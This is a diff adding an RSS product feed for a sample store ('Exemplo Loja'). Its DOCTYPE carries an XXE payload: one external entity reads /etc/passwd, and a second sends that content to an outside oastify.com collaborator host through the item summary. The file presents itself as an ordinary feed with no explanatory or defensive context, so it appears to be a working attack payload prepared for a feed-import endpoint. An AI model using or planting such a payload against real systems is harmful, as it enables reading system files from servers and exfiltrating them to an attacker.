@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ELEMENT rss ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY exfiltrate SYSTEM "http://zfi9dy10kn4t00lct7el03bgx73yrpudj.oastify.com/?data=&xxe;">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Exemplo Loja</title>
+    <item>
+      <source>rss</source>
+      <title>Produto Exemplo</title>
+      <summary>&exfiltrate;</summary>
+      <link>https://www.exemploloja.com/produto/exemplo</link>
+      <image_url>https://www.exemploloja.com/images/produto.jpg</image_url>
+    </item>
+  </channel>
+</rss>
